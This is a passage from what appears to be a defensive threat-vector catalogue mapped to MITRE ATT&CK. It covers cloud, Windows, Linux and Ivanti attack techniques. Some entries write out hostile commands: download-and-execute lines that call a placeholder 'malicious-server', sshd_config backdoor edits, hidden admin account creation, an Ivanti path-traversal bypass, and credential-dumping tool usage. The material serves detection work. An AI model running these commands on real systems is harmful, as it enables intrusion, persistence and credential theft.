## Attack Flow and Methodology

1. The adversary enumerates storage resources, searches for containers of interest, 
and assesses the feasibility of replication configuration.
2. Using their access, the attacker creates an **object replication policy** from 
victim storage to a destination account they control, potentially in a different 
geographic region or Azure tenant.
    - Outbound replication exfiltrates data; inbound can inject payloads.
    - Cross-tenant replication may currently require explicit configuration, and 
    new Azure defaults restrict this, but legacy or misconfigured accounts remain vulnerable.
3. Replication occurs asynchronously, repeatedly syncing new or changed objects. 
The attacker harvests data from their own account, separate from the victim’s monitoring 
and controls, thus bypassing many detection points.
4. Depending on their goal, the attacker may leave replication running for long-term 
persistence or attempt to erase traces from the victim environment.
",1,2025-09-08,2025-09-08,,,"{'support::enabled': ['53f4e2f0-7d11-4629-bb26-905993a589db', '41f57a57-1ed6-407e-bb70-a0f6ab52af10', '2d7ed070-e5c5-4796-b150-ea1d02ed1785'], 'sequence::preceeds': ['2743bf18-3b86-4721-bf3e-153dcda0b149']}",Storm-0501,"T1567.002, T1078.004, T1530"
60c5b065-7d06-4697-850f-c2f80765f10b,Changes to Azure infrastructure deployed through Azure CLI,Threat Vectors,clear,"A threat actor in control of the prerequisites may attempt to use the Azure
CLI to perform changes either to the endpoint from which the CLI is 
accessed or on remote infrastructure, user accounts, service principals, 
or configurations. 

A threat actor can only perform changes that are allowed in the scopes of
credentials, temporary credentials, or service principals that the threat 
actor has control of, barring usage of a vulnerability in Azure to allow
more than that.
",1,2022-12-22,2022-12-22,,,,,T1059
cd1baed8-3ea8-42e1-a27d-9da9ddb2f5b8,Switching off forced signed commits for GitHub repository,Threat Vectors,clear,"Development and DevOps teams may turn on signed commits to ensure that an 
attacker cannot commit code to a code repository of an organization by 
merely succesfully stealing an OAuth token of a developer. With forced 
commits, the attacker will be blocked from committing code changes to a
repository, essentially limiting the attacker from attaining lateral 
movement or similar objectives, unless the attacker turns off the forced 
commit policy. 
",1,2022-11-28,2022-11-28,,,,,T1562
ba88c4a0-bf3b-46cb-b022-050ae22abce8,HackBrowserData browser data export,Threat Vectors,clear,"HackBrowserData is a command-line tool for decrypting and exporting data
(passwords, history, cookies, bookmarks, credit cards, download history,
localStorage and extensions) from the browser. 

It supports the most popular browsers on the market and runs on Windows, macOS and Linux.

Usage examples:

## Automatic scan of the browser on the current computer, 
   outputting the decryption results in JSON format and compressing as zip.

PS C:\Users\JohnDoe\Desktop> .\hack-browser-data.exe -b all -f json --dir results --zip

PS C:\Users\JohnDoe\Desktop> ls -l .\results\
    Directory: C:\Users\JohnDoe\Desktop\results

## Run with custom browser profile folder, using the -p parameter to specify the
   path of the browser profile folder.
  
PS C:\Users\JohnDoe\Desktop> .\hack-browser-data.exe -b chrome -p ""C:\Users\User\AppData\Local\Microsoft\Edge\User Data\Default""

[NOTICE] [browsingdata.go:59,Output] output to file results/chrome_creditcard.csv success  
[NOTICE] [browsingdata.go:59,Output] output to file results/chrome_bookmark.csv success  
[NOTICE] [browsingdata.go:59,Output] output to file results/chrome_cookie.csv success  
[NOTICE] [browsingdata.go:59,Output] output to file results/chrome_history.csv success  
[NOTICE] [browsingdata.go:59,Output] output to file results/chrome_download.csv success  
[NOTICE] [browsingdata.go:59,Output] output to file results/chrome_password.csv success  
",1,2024-11-05,2024-11-05,,,{'atomicity::implements': ['b0d6bf74-b204-4a48-9509-4499ed795771']},,T1111
b32ced71-138b-4076-8376-4f13161af4b0,Alteration of sshd_config file,Threat Vectors,clear,"This threat vector highlights the risk associated with unauthorized access or 
alteration of the `sshd_config` file on Linux systems. Adversaries who manage 
to gain elevated privileges (root or sudo) can modify SSH service parameters 
in `sshd_config` to allow additional keys, redirect ports, or weaken 
authentication requirements.  

Possible scenario done by a threat actor :

### Adding Rogue SSH Keys
An attacker with root or sudo privileges could append a malicious public key to 
the authorized_keys directive in sshd_config. For instance:

```bash
echo ""AuthorizedKeysFile /etc/ssh/my_malicious_keys"" >> /etc/ssh/sshd_config
```
They might then place their public key in that file. This allows them to log in 
via SSH without needing a password, often bypassing standard detection.  

### Enabling Root Login
If an organization has wisely disabled direct root login, an attacker could revert 
that setting in sshd_config:

```bash
sed -i 's/^#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
```
By doing so, they allow themselves to authenticate as root directly.  

### Allowing Password Authentication
In secure environments, SSH often requires key-based authentication. 
An attacker might weaken this by enabling password-based access and choosing 
easy-to-guess credentials:

```bash
sed -i 's/^PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config
```
Once changed, brute-force or credential-stuffing techniques become more feasible, 
helping the adversary maintain illicit access.  

### Redirecting SSH Ports
Defenders commonly monitor TCP port 22 for suspicious activities. An attacker 
could modify sshd_config to run SSH on a high or less-monitored port:

```bash
sed -i 's/^Port 22/Port 2222/' /etc/ssh/sshd_config
```
This tactic helps attackers blend into legitimate traffic patterns or bypass 
perimeter defenses that only monitor the default SSH port.  

### Creating Hidden Backdoors
Attackers may add an additional Match block in sshd_config that grants special 
privileges to a specific user or from a specific IP range:

```bash
echo ""Match User hiddenuser
    X11Forwarding yes
    AllowTcpForwarding yes"" >> /etc/ssh/sshd_config
```
This configuration could stealthily enable features like port forwarding, 
further helping attackers evade detection and maintain persistence.  
",1,2025-01-07,2025-01-07,,,,"[Enterprise] APT29, UNC2452, [ICS] Wizard Spider, UNC1878, [Enterprise] TeamTNT, TeamTNT",T1098.004
31e7f292-8370-4255-861d-edd68ed8b7b0,Azure - External Entity Access,Threat Vectors,clear,"The following threat vector refers to a set of persistence techniques where an adversary 
configures a target Azure tenant to be managed or accessed by external entities, 
such as another tenant, external users, or identity providers. This section provides 
in-depth coverage of this threat vector according to the Azure Threat Research Matrix, 
addressing scenario, goals, impact, and methodology.

### Example Attack Scenario

An attacker gains Global Administrator privileges in a compromised tenant and uses Azure 
Lighthouse to register an external, attacker-controlled tenant as a delegated administrator. 
This allows the attacker to manage resources and maintain persistence even if their 
initial account is detected and removed. Alternatively, the attacker might use Microsoft 
Partner Delegated Administrative Privileges, transfer a subscription (“subscription hijack”), 
or add a new federated domain or identity provider, creating hidden backdoors for 
future access.

- For example, after compromising credentials, an attacker uses Microsoft Graph 
API to modify tenant settings and register their own tenant as a manager via Azure Lighthouse.
- The administrator in the compromised tenant is unaware as delegated permissions 
silently persist, giving the attacker full control over resources and users.
- Even after password resets or removal of individual malicious accounts, the external 
entity persists via configuration and cannot be easily detected without deep audit 
review of resource assignments and domain trusts.

### Attack Goals and Impact

The main goal is to establish persistence inside the target Azure environment through 
external entity control.

- Maintain long-term, resilient access to cloud resources, regardless of changes 
in local credentials or account clean-ups.
- Allow management of resources remotely from attacker-controlled tenants.
- Facilitate lateral movement, data exfiltration, or further privilege escalation 
by leveraging cross-tenant capabilities and hidden delegated privileges.

The impact may include:

- Full compromise of cloud assets and data.
- Unnoticed attacker presence persisting through routine security hygiene (such as credential revocation).
- Increased difficulty for defenders to detect or remove persistent access mechanisms.

### Attack Flow and Methodology

The typical attack flow involves several steps:

1. Privilege abuse: The attacker uses available tools (including Microsoft Graph 
API, PowerShell modules, or Azure Portal) to grant management rights or delegated 
access to an external entity (such as Azure Lighthouse, Microsoft Partner delegation, 
or domain trust modification).
2. Configuration: The attacker registers their external tenant, sets up delegated 
access, or modifies domain trust/federation settings to establish a persistent link.
3. Stealthy persistence: Even if initial access accounts/credentials are remediated, 
the external entity retains management capabilities—allowing the attacker to create 
new accounts, manage resources, or harvest sensitive data.
4. Maintenance: The attacker periodically refreshes delegated permissions, adds 
new external users/entities, or modifies trust relationships as needed to maintain 
access and evade detection.
",1,2025-09-22,2025-09-22,,,"{'support::enabled': ['53063205-4404-4e6d-a2f5-d566c6085d96', '10a89280-d42e-446d-9f8d-840b1218f532', '4e7eae8e-6615-41f2-bfe1-21a04f7a6088', '2900d389-3098-49d3-8166-5b2612d03576'], 'atomicity::implemented': ['2743bf18-3b86-4721-bf3e-153dcda0b149', '4e7eae8e-6615-41f2-bfe1-21a04f7a6088'], 'support::synergize': ['2fd1cddb-c66d-4a99-9779-31e32b67495e', '9bb31c65-8abd-48fc-afe3-8aca76109737']}","Scattered Spider, APT29","T1133, T1484.002, T1078.004"
4b1c47ee-f45a-4b89-98e7-e943bcd5dd19,Command injection on web components of Ivanti Connect Secure appliances,Threat Vectors,clear,"Attackers may manage to inject commands to an Ivanti Connect Secure 
appliance (that provide remote VPN access to corporate 
infrastructures) either with valid credentials for vulnerable 
authenticated endpoints or exploiting a vulnerability to bypass 
authentication.  

These vulnerabilities are identified as CVE-2024-21888 and 
CVE-2024-21893. CVE-2024-21893 have been exploited in the wild chained 
with CVE-2024-21887 and can lead to remote adversaries to execute 
arbitrary commands on targeted gateways.

In addition to the list of LOLbins see [3], following commands were 
used in the ICS attack is the following:
- aria2c
- at
- cat 
- check_ssl_cert
- crash
- crontab
- echo
- mount
- nohup
- pidstat
- sed
- split
- sysctl
- tcpdump
- wireshark
- tshark
",3,2024-01-15,2024-04-18,,,"{'support::synergize': ['810057c6-cb84-41e4-add4-ae56b52c8ab7'], 'support::enabling': ['4d6104e3-10d4-4a12-b081-d937df848891']}",Gelsemium,T1190
2fd1cddb-c66d-4a99-9779-31e32b67495e,Azure - Lateral movement abusing Cross-Tenant Synchronization,Threat Vectors,clear,"When configuring CTS, an Azure source tenant will be synchronized with a target tenant, 
where users from the source can automatically be synchronized to the target tenant. 
When synchronizing users, the user is only pushed from the source and not pulled 
from the target, making this a one-sided synchronization.

However, if improperly configured, attackers who have already compromised a tenant and gained
elevated privileges may exploit this feature, to move laterally to other connected tenants.

Attackers must look for tenants with 'Outbound Sync' enabled, which allows syncing
to other tenants. Next step is to locate the app used for CTS syncing and modify
its configuration to add the compromised user into its sync scope,
gaining access to the other tenant's network.

This allows the threat actor to achieve lateral movement without requiring new user credentials.
",2,2023-08-07,2025-01-01,,,,,T1021.007
e7f05c4e-ca96-45e5-9788-116f802e1f32,Enumerate EC2 instance data using AWS metadata service,Threat Vectors,clear,"Threat actors collect AWS IDs from EC instances by using AWS metadata
service that is running by default. AWS account ID is a unique identifier
that is used to identify an AWS account, AWS resource management or to
access to AWS services.

Threat actors can extract different elements from metadata service, for
example: 

- accountId
- architecture
- availabilityZone
- billingProducts
- devpayProductCodes
- marketplaceProductCodes
- imageId
- instanceId
- instanceType
- kernelId
- pendingTime
- privateIp
- ramdiskId
- region
- version

AWS metadata keeps information for the instance such as instance id,
AMI id, hostname, ip address, security groups, public-ip and others.
Instance metadata usually is divided into different categories. Instance
metadata build based on the category is specified with a new version
number. In some cases the instance metadata is available only when a new
build version is launched. The categories are classified for example by
elastic-gpu-id, role-name, instance-type, operation system (windows, mac or
linux), ami-id (Amazon Machine Image ID), public-ip, vhostmd and by the
version when category was released.

Examples: 

Category:                                        Version ID:
ami-id                                           1.0
block-device-mapping/ami                         2007-12-15
elastic-gpus/associations/elastic-gpu-id         2016-11-30
iam/security-credentials/role-name               2012-01-12
network/interfaces/macs/mac/public-hostname      2011-01-01

Threat actors can extract information from the AWS metadata service with
the user token and curl command. For curl commands - cURL tool is usually
used for automation of AWS metadata information collection. 

Tools like curl on *nix-based systems, or Invoke-Rest Method in PowerShell
on Windows are used for extraction of AWS metadata as they send GET requests
for data collection. AWS exposes an Instance Metadata endpoint on every EC2 
Instance at the address: http://169.254.169.254

Example: 

curl http://169.254.169.254/latest/meta-data/

OR

Curl command with a token for extraction of additional matadata information: 

TOKEN=`curl -X PUT ""http://169.254.169.254/latest/api/token"" -H ""X-aws-ec2-metadata-token-ttl-seconds: 21600""`
curl -H ""X-aws-ec2-metadata-token: $TOKEN"" http://169.254.169.254/latest/dynamic/instance-identity/document

Example for extraction of AWS metadata with bash script:

INSTANCEID=$(curl -sL http://169.254.169.254/latest/meta-data/instance-id)
$ echo INSTANCEID
",6,2022-11-30,2023-01-05,,,,,"T1119, T1552.005"
765be5d9-4f79-4e3d-b894-fa428f285ab5,Download and Execute Payloads with Windows Utilities,Threat Vectors,clear,"1. Bitsadmin.exe\
**Description**: A command-line tool to create and manage BITS jobs. 
Threat actors use it to download or upload files stealthily.

Example:

```
bitsadmin.exe /transfer myJob /download /priority high http://malicious-server/payload.exe C:\temp\payload.exe
start C:\temp\payload.exe
```

2. Certutil.exe\
**Description**: A command-line tool for manipulating certificates. 
It can be used to download files and perform Base64 encoding/decoding.

Example:

```
certutil.exe -urlcache -split -f http://malicious-server/payload.exe C:\temp\payload.exe
```

3. Wmic.exe\
**Description**: Windows Management Instrumentation Command-line (WMIC) is 
a command-line utility that provides a powerful interface to the 
Windows Management Instrumentation (WMI) infrastructure. 
It allows administrators to perform management tasks on both local and remote Windows systems

Example:

Execute payload on a local machine:
```
wmic process call create ""powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command \""IEX(New-Object Net.WebClient).DownloadString('http://malicious-server/payload.ps1')\""""
```

Execute a remote script:
```
wmic /node:""REMOTE_COMPUTER_NAME"" process call create ""powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command \""Invoke-WebRequest -Uri 'http://malicious-server/payload.exe' -OutFile 'C:\\Windows\\Temp\\payload.exe'; Start-Process 'C:\\Windows\\Temp\\payload.exe'\""""
```",1,2024-11-05,2024-11-05,,,{'atomicity::implements': ['d5039f2c-9fcc-4ba3-ad6a-da8c891ba745']},"[ICS] FIN7, FIN7, [Enterprise] Turla, Turla, [Enterprise] APT29, UNC2452","T1105, T1218"
94b7287b-ae84-4b89-8093-63898c7475c9,Credential file download to compromised Windows endpoint,Threat Vectors,clear,"A credential file download to Windows compromised endpoint
refers to a process where an attacker downloads sensitive
credential files to this system. A threat actor usually
target to download files containing passwords, authentication
tokens, or other sensitive information. Threat actors may use
remote tools to download Windows credential files and to
extract their content if its decrypted ref [1], [2].  

### Methods used by the threat actors

Threat actors may use various methods to download credential files,
for example:

- SMB (Server Message Block) exploitation: Attackers may exploit
vulnerabilities in SMB to gain access to the compromised endpoint
and download credential files.
- PowerShell scripts: Attackers may use PowerShell scripts to
download credential files from the compromised endpoint.
- Remote Desktop Protocol (RDP): Attackers may use RDP to gain
access to the compromised endpoint and download credential files.
- Malware: Attackers may use malware to download credential files
from the compromised endpoint.
- Curl for Windows (via HTTP requests) - Adversaries could abuse
`Curl` to download files or upload data to a remote URL address
ref [2].  
- Remote Desktop PassView - this tool can access Windows credential
files via .rdp files. It's possible such file to contain user's
credentials ref [3]. 

### Known types of files which may contain user's credentials 

The following types of credential files may be downloaded by the
attackers through a compromised network:

- SAM (Security Account Manager) files: These files contain hashed
passwords for local user accounts.
- NTDS.DIT files: These files contain hashed passwords for Active
Directory user accounts.
- Credential Manager files: These files contain stored credentials
for applications and services.
- SSH key files: These files contain private SSH keys used for
authentication.  

### An example 

Threat actors can download and use the accessed credential user's
files to connect to a database further, without having to enter
login credentials each time they access the database. The database
system will authenticate their login based on the information
stored in the credential file.   
",1,2025-03-12,2025-03-12,,,,"[Enterprise] TA505, TA505, [Enterprise] Leafminer, RASPITE, [ICS] APT33, APT33","T1552.001, T1555.004"
cc546bbc-f71c-4538-934c-415d6adc293b,Password spraying attack,Threat Vectors,clear,"Password spraying is a technique that attackers use to try a small list
of common or expected passwords against a set of usernames. This technique
is used to avoid account lockouts that would normally occur when brute
forcing a single account with many passwords1. Password spraying is a
sub-technique of credential spraying, which is just credential guessing
but ""sprayed"" (i.e. against multiple accounts). (ref [1], [2])  

Adversaries have been observed using password spray attacks to exploit
logins of network services or credential harvesting, typically used
to obtain initial foothold.

They attempt username and password combinations in a slow manner,
researching the pattern for valid accounts (e.g. email address or username
length). Organizations targeted typically see a few authentication attempts
per account; with nearly every attempt originating from constantly rotating
IP addresses, many associated with the Tor anonymizing service.  

Some strategies conducted by adversaries are:  

- Credential stuffing towards Microsoft Office 365 accounts, there are
tools that identify valid credentials for Office 365 and Azure AD accounts,
as Spray365.  

- Abuse of Exchange servers. There are tools for searching through email
in an Exchange environment for specific terms (passwords, insider intel,
network architecture information, etc.) as for example MailSniper; which
includes modules for password spraying, enumerating users and domains or
gathering the Global Address List (GAL) from OWA and EWS.  

- Password spray against exposed Active Directory Federation Services
(ADFS) infrastructure. The organizations not using MFA have a higher risk
of having accounts compromised through password spray. If attack is
successful, adversaries may look for additional contacts, sensitive
information, privileged information, or send phishing links to
others in the organization.  


- Password spraying attack against Microsoft Entra ID applications
Password spray attacks involve trying a few common passwords against
specific or many accounts. This may include and attack against the
cloud-based Microsoft application solution: Microsoft Entra ID. The
goal is to bypass traditional protections like password lockout and
malicious IP blocking. They can include low number of login attempts
or lack of consistency which makes them difficult to detect.  
",3,2024-03-27,2025-10-01,,,,"[Enterprise] APT29, UNC2452, [Mobile] APT28, APT28, [ICS] APT38, Lazarus Group, [Enterprise] Chimera, [Enterprise] Ke3chang, APT15, [Enterprise] MuddyWater, MuddyWater, [Enterprise] Leafminer, RASPITE, [ICS] APT33, APT33",T1110.003
53063205-4404-4e6d-a2f5-d566c6085d96,"Data collection using SharpHound, SoapHound, Bloodhound and Azurehound",Threat Vectors,clear,"The threat vector of data collection using SharpHound, BloodHound, and AzureHound 
represents a sophisticated method for gathering and analyzing information about 
an organization's Active Directory (AD) and Azure environments. This vector is 
particularly concerning because it can be used by both security professionals and 
malicious actors to map out potential attack paths and vulnerabilities.    

## Tools Overview    

**SharpHound**: A data collection tool designed for Active Directory environments. 
It gathers information about users, groups, computers, and their relationships within 
the AD structure.    

**BloodHound**: A visualization tool that ingests data collected by SharpHound and 
AzureHound. It presents the information in a graph format, allowing for the identification 
of complex attack paths and security misconfigurations.    

**AzureHound**: The cloud counterpart to SharpHound, specifically designed to collect 
data from Azure Active Directory and Azure Resource Manager.    

**SoapHound**: It is an enumeration tool in Active Directory Web Services (ADWS) debug logs. 
ADWS enumeration creates multiple GetXmlValue events for each attribute, it leverages the ADWS 
protocol (SOAP over port 9389) instead of traditional LDAP queries.
LDAP queries are wrapped within a series of SOAP messages, which are sent to the ADWS server 
using NET TCP Binding communication channel. Following, ADWS server unwraps the LDAP queries
and forwards them to the LDAP server running on the same Domain Controller. As a result, LDAP
traffic is not sent via the wire and therefore is not easily detected by common monitoring tools.


## Threat Vector Mechanics    

The mechanics of this threat vector involve the systematic collection, processing, 
and analysis of data from Active Directory (AD) and Azure environments to identify 
potential attack paths. Here's how it works:    

1. **Data Collection**:
  - **SharpHound** gathers data from Active Directory using LDAP/LDAPS queries 
  and RPC over named pipes. It collects information on domain trusts, object properties 
  (users, groups, computers, etc.), ACLs, group memberships, and more.
  - **AzureHound** collects data from Azure AD and Azure Resource Manager (AzureRM) 
  using Microsoft Graph and Azure REST APIs. It retrieves information about admin 
  roles, users, groups, apps, devices, service principals, and other Azure objects 
  accessible to the authenticated user.
  - These tools generate JSON files containing detailed information about the target 
  environment.    

2. **Data Packaging**:
  - The collected data is compressed into ZIP files for efficient transfer and 
  storage. These files are ready for ingestion into the BloodHound database.    

3. **Data Ingestion**:
  - The ZIP files are imported into a Neo4j graph database via the BloodHound interface. 
  This database serves as the backbone for analyzing relationships and permissions 
  within the collected data.    

4. **Graph Analysis**:
  - BloodHound visualizes the data as a graph where nodes represent objects 
  (e.g., users, groups, computers) and edges represent relationships or permissions 
  (e.g., group memberships or access rights).
  - Users can perform Cypher queries to identify attack paths such as privilege 
  escalation opportunities or lateral movement routes.    

5. **Attack Path Discovery**:
  - The visualized graph highlights misconfigurations or exploitable relationships 
  that attackers can leverage (e.g., accounts with excessive privileges or vulnerable trust relationships).    

This process enables attackers to systematically uncover weaknesses in AD or Azure 
environments for exploitation.

### How the Threat Works

- **Stealthy Protocol**: SOAPHound uses ADWS, which is less commonly monitored than 
LDAP, allowing attackers to collect data with minimal detection.
- **Bulk Collection**: It gathers large amounts of directory data-such as users, 
groups, computers, group memberships, and access control lists (ACLs)-in a few bulk 
queries rather than thousands of individual LDAP requests.
- **Sensitive Information**: The data collected includes everything needed to map 
attack paths, identify privilege escalation opportunities, and plan lateral movement 
within the AD environment.
- **BloodHound Compatibility**: The output is formatted for BloodHound, a tool used 
to visualize and analyze attack paths in AD.

### Key Data Collected

- **User and Group Listings**: Names, SIDs, group memberships.
- **Computer Accounts**: Details about machines in the domain.
- **ACLs/Permissions**: Who has rights over what objects.
- **Certificate Authority Info**: For potential abuse in AD CS attacks.
",2,2025-03-20,2025-05-12,,,"{'sequence::succeeds': ['1a68b5eb-0112-424d-a21f-88dda0b6b8df', 'dd5d942c-bac4-4000-b9a6-ca4fef6cfb84']}","WIZARD SPIDER, APT29, TA505","T1087, T1069, T1482, T1018, T1201"
fc858766-0618-4a4f-973c-526402a83582,Abusing Lolbins to Enumerate Network Configuration,Threat Vectors,clear,"System Network Configuration Discovery refers to an adversary’s effort to gather
and enumerate network-related information from compromised systems. This activity 
is often a precursor to more aggressive tactics, including lateral movement 
or data exfiltration. By executing commands or employing specific utilities to 
determine active network interfaces, routing tables, firewall states, and open ports, 
threat actors can map out an organization’s network architecture. 
This information allows them to identify potential choke points, pivot opportunities, 
and security gaps that could be exploited in subsequent stages of an attack.

## Common Tools & Commands
### Windows  

1) cmd.exe:
  - `ipconfig` to display IP addresses and network interfaces. 
  - `netstat` to list active TCP/UDP connections and listening ports.
  - `route print` to display routing tables.  

2) powershell.exe: 
  - `Get-NetIPConfiguration` to display IP addresses and network interfaces. 
  - `Get-NetTCPConnection` to display active network connections.
  - `Get-NetRoute` to display routing tables.  

3) netsh.exe: 
  - `netsh interface ip show config` for advanced interface information. 
  - `netsh interface ip show dns` to display DNS settings.

4) nslookup.exe: 
  - `nslookup <domain_name>` to display DNS records for a domain name. 

5) wmic.exe: 
  - `wmic nic get` to display network interface settings.
  - `wmic route get` to display routing tables.

### Linux and macOS 
  - `ifconfig` or `ip` to show IP address configuration and network interfaces.  
  - `arp` to examine the ARP table for link-layer address mapping.  
  - `netstat` or `ss` to display active connections and listening services.  
  - `route` to view or modify the IP routing table.  
  - `iptables`, `firewall-cmd`, `ufw` to query or adjust firewall settings.  
  - `dig` to query DNS servers and display DNS records.",1,2025-01-14,2025-01-14,,,,"[Enterprise] APT29, UNC2452, [Enterprise] TeamTNT, TeamTNT, [Mobile] APT28, APT28",T1016
b330d3a8-1783-4210-9fec-11e6ecfe135e,Web Path Traversal Attack,Threat Vectors,clear,"Directory traversal (also known as file path traversal) is a web security
vulnerability that allows an attacker to read arbitrary files on the server
that is running an application. 

By manipulating variables that reference files with “dot-dot-slash (../)”
sequences and its variations or by using absolute file paths, it may be
possible to access arbitrary files and directories stored on file system
including application source code or configuration and critical system files.
",2,2022-09-01,2025-10-01,,,,,T1083
810057c6-cb84-41e4-add4-ae56b52c8ab7,authentication bypass on Ivanti Connect Secure appliances,Threat Vectors,clear,"### chained exploitation of CVE-2023-46805 or CVE-2024-21893 together with CVE-2024-21887.

Attackers may chain exploits on vulnerabilities CVE-2023-46805 and 
CVE-2024-21893 on Ivanti Connect Secure (ICS) appliances (that provide 
remote VPN access to corporate infrastructures) to fully compromise the 
vulnerale appliance.  

The code on the appliance checks whether access to the requested uri_path 
requires authentication or not. For endpoint `/api/v1/totp/user-backup-code` 
the check is done only on the start of the string.  

So an attacker can append additional characters that are passed to the 
webserver without additional checks. Using path traversal technique, it is 
then possible to access API endpoints that would require authentication 
when accessed directly. For example, successful request to 
`/api/v1/totp/user-backup-code/../../system/system-information` will return
the system information.  

CVE-2023-46805 allows then to access any other uri_path without 
authentication and enables exploitation of CVE-2024-21887.

Later it was reported that initial mitigations for CVE-2023-46805 could be 
by passed by exploiting CVE-2024-21893 to bypass authentication and 
enabling CVE-2024-21887 without using vulnerable uri paths or to drop 
custom webshells ([BUSHWALK](https://advantage.mandiant.com/malware/malware--96732cf0-d99a-501b-9646-c49f2b30dd5a) 
[LIGHTWIRE](https://advantage.mandiant.com/malware/malware--089bf6cc-9b67-5bd5-8fd3-3330e7cedf7e) 
[CHAINLINE](https://advantage.mandiant.com/malware/malware--4a3560fd-5ec5-5581-a8f7-1c888d28186b) 
and others have been observed.  

Exploitation of the SSRF generates up to 2 log events:
- AUT31556 on `/dana-ws/saml.ws`
- ERR31093: Program saml-server recently failed. 

Likewise, exploition of CVE-2024-21893 or CVE-2024-22024 enables 
exploitation of CVE-2024-21887.

### Other TTPs

- *Configuration and data theft* Exfiltration of configuration or cache 
data either in the response to the request (so on apparently legit activity)
or by replacing or creating a new file under unauthenticated uri path.
- CAV Web Server Log Exfiltration 
- Internal Check tool tampering
- System log clearing: In some instances, logs have been cleared using the legitimate system 
utility therefore generating event ID ADM20599.
",1,2024-01-15,2024-01-29,,,,Gelsemium,"T1011, T1041, T1070, T1190"
c4456134-df7b-4969-b5ff-a24794996890,Impersonate IT support via a spoofed phone call to deceive a victim and gain a remote access,Threat Vectors,clear,"IT support impersonation via spoofed phone calls is a common social
engineering technique used by attackers to gain initial access to an
organisation's network. This tactic is often combined with other
techniques, such as email flooding or phishing, to create a sense
of urgency and legitimacy. To deceive victims, attackers may use
one of the following methids:

- Use spoofed phone numbers: The threat actors can use spoofed phone
numbers that appear to be from the organisation's IT department or a
legitimate company.  
- Create a sense of urgency: Attackers may claim that there is a critical
issue with the victim's computer or account that requires immediate
attention.
- Use technical jargon: Some threat actor groups are observed to use
technical terms and acronyms to sound legitimate and knowledgeable.
- Request remote access: Attackers may ask the victim to grant remote
access to their computer or network, often through tools like Zoom,
Anydesk, Any Connect, TeamViewer or Microsoft Quick Assist.    

### Possible scenario

Threat actor groups are targeting an organisation by gathering variety of
user's data, for example, employee email addresses and the IT department's
phone number. They can flood an employee with unsolicited emails and then
impersonate IT support via a spoofed phone call, tricking the employee
into granting remote access through `Microsoft Quick Assist` ref [1].   

Because `Quick Assist` uses the RDP stack (T1021.001), the attacker gains
an RDP session under the user's context. If the targeted users has extended
rights, the attacker can sidesteps perimeter ACLs, and disables input
monitoring. A hidden admin account is added ref [1], [3]:  

```
*net user svc_updater P@ss123! /add*,
*net localgroup administrators svc_updater /add*)
```

and a signed Hyper-V VHDX (`*windows_storage.vhdx*`) containing Cobalt
Strike and the 3AM encryptor is transferred over SMB. Credential dumping
from *lsass.exe* and *net group ""domain admins"" /DOMAIN* follow, before
the payload encrypts mapped drives and drops *README_3AM.txt*.  

By performing such attack, the threat actor maintains persistence and
can exfiltrates available data towards any server he controls.  
",1,2025-06-02,2025-06-02,,,"{'atomicity::implements': ['06c60af1-5fa8-493c-bf9b-6b2e215819f1'], 'sequence::succeeds': ['58b98d75-fc63-4662-8908-a2a7f4200902']}",,"T1624, T1566, T1566.004, T1210, T1033, T1016, T1219, T1078, T1105"
bdc58fee-8da6-4fc9-8fbd-30f8fd156bc7,Powershell with encoded payload passed to cmdline,Threat Vectors,clear,"When working with PowerShell, a threat actor can encode a command or script
using Base64 or other type of encoding and pass it as a parameter to the
command line. This technique is useful for obfuscating sensitive
information or executing complex commands. (ref [1])   


The malicious document contains a macro which, upon execution,
creates a batch script at C:\Users\public\new[.]bat with the
following content:  

powershell -exec bypass -noP -w hidden -nonI -enc""{string}"" del %0;

Other possible examples for encoding with PowerShell commands: 

Encoding a Command with Base64

1. Create a command as a string. 

$command = 'dir ""C:\Program Files""'

2. Convert the command to Base64:

$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)

Now you can run the encoded command using powershell.exe:

powershell.exe -encodedCommand $encodedCommand

It's also possible to encode domain names, for example: 

Powershell input:

[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(""'sample_domain.com'""))

Threat actors also use PowerShell scripts for faster encoding process and result.  

An example of Powershell script (ref [2])  

param(
[Parameter()][Alias(""un"")][string]$Username,
[Parameter()][Alias(""pw"")][string]$Password
)

Write-Host ""Username: $Username""
Write-Host ""Password: $Password""
",1,2024-04-23,2024-04-24,,,,"[Mobile] APT28, APT28, [Enterprise] Threat Group-3390, APT27","T1027.010, T1059, T1059.001, T1140, T1068"
5d373113-18f9-41bb-bdde-3abbfa53cb86,Passing SeDebugPrivilege to AdjustTokenPrivilege API elevating privileges of a running process,Threat Vectors,clear,"A threat actor can attempt to escalate privileges from a user or 
administrator context to NT SYSTEM by using the SeDebugPrivilege to adjust 
the memory of running process with a call to the AdjustTokenPrivilege API. 
This method uses built-in Windows APIs and commands to escalate privileges 
by changing the privileges of the running process in-memory. See Palantir 
reference. 

The intention of access token impersonation/theft is to grant a process the 
same permissions as another running process with a specific context, often 
NT SYSTEM. This may increase the capabilities of the now-elevated process 
or reduce its probability of detection.

For access token impersonation an adversary can use standard command-line 
shell to initiate 'runas' commands or to use payloads that call Windows 
token APIs directly. The changes in Windows API calls can manipulate 
access tokens for further account access and malicious purposes. 
",1,2022-11-16,2022-11-17,,,,,T1134.001
20bd3620-b13b-4895-b291-b1a26bd9aef3,MS 365 admin compromised account,Threat Vectors,clear,"Compromised credentials may be used to bypass access controls placed on various resources on systems
within the network and may even be used for persistent access to remote systems and externally
available services, such as VPNs, Outlook Web Access, network devices, and remote desktop.

Compromised credentials may also grant an adversary increased privilege to specific systems or access
to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction
with the legitimate access those credentials provide to make it harder to detect their presence.

There are several methods used by adversaries to compromise valid accounts, such as:  

- Phishing attacks (Spear Phishing, Whaling, BEC).  
- Password guessing and cracking (Credential stuffing, Bruteforce, Password spraying, exploiting weak passwords).
- OAuth and API Abuse.
- Exploiting vulnerabilities in third-party software.   
